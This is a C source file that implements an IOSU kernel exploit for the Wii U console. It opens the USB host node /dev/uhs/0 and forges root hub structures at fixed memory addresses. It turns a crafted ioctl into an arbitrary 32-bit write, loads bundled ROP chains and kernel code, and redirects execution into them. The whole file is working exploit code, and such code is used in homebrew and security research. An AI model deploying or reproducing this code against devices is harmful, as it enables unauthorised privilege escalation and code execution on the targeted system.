#include <string.h>
#include <nsysnet/socket.h>
#include <coreinit/memory.h>
#include <whb/proc.h>
#include <whb/log.h>
#include <whb/log_udp.h>
#include <coreinit/screen.h>
#include <coreinit/memheap.h>
#include <coreinit/cache.h>
#include <coreinit/memfrmheap.h>
#include <coreinit/memory.h>
#include <coreinit/ios.h>
#include <coreinit/thread.h>

#include "IOSU_Exploit.h"

#include "binary_data/arm_user.h"
#include "binary_data/second_chain.h"
#include "binary_data/final_chain.h"

/* IOSU Exploit Constants */
uint32_t *Root_Hub1 = (uint32_t *)0xF5003ABC;
uint32_t *Root_Hub2 = (uint32_t *)0xF4500000;

void USB_Write32(IOSHandle handle, uint32_t addr, uint32_t value)
{
	Root_Hub2[520] = addr - 24;
	DCFlushRange(Root_Hub2, 521 * 4);
	DCInvalidateRange(Root_Hub2, 521 * 4);

	OSSleepTicks(0x200000);

	uint32_t request_buffer[] = {0xFFF415D4, value};
	uint32_t output_buffer[32];

	WHBLogPrintf("%d", IOS_Ioctl(handle, 0x15, request_buffer, 0x08, output_buffer, 0x80));

}

void IOSU_Exploit(uint8_t* kernel_code, int kernel_code_size)
{
	/* open the needed iosu node */
	IOSHandle IOS_USB_Node_FD = (IOSHandle)IOS_Open("/dev/uhs/0", (IOSOpenMode)0);

	WHBLogPrintf("/dev/uhs/0: %d", IOS_USB_Node_FD);

	memset(Root_Hub1, 0, 0x800);
	memset(Root_Hub2, 0, 0x800);

	Root_Hub2[5] = 1;
	Root_Hub2[8] = 0x00500000; // OSEffectiveToPhysical(Root_Hub2)

	Root_Hub1[33] = 0x00500000; // OSEffectiveToPhysical(Root_Hub2)
	Root_Hub1[78] = 0;

	DCFlushRange(Root_Hub1, 0x1000);
	DCInvalidateRange(Root_Hub1, 0x1000);

	uint32_t *hehe = (uint32_t*)&final_chain_bin[796];
	*hehe = kernel_code_size;

	memcpy((char*)0xF4120000, second_chain_bin, second_chain_bin_len);
	memcpy((char*)0xF4130000, final_chain_bin, final_chain_bin_len);
	memcpy((char*)0xF4140000, kernel_code, kernel_code_size);
	memcpy((char*)0xF4148000, arm_user_bin, arm_user_bin_len);

	DCFlushRange((char*)0xF4120000, second_chain_bin_len);
	DCFlushRange((char*)0xF4130000, final_chain_bin_len);
	DCFlushRange((char*)0xF4140000, kernel_code_size);
	DCFlushRange((char*)0xF4148000, arm_user_bin_len);

	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0x14, 0x1016AD40 + 0x14 + 0x4 + 0x20);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0x10, 0x1011814C);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40 + 0xC, 0x00120000);
	USB_Write32(IOS_USB_Node_FD, 0x1016AD40, 0x1012392b);

	IOS_Close(IOS_USB_Node_FD);

}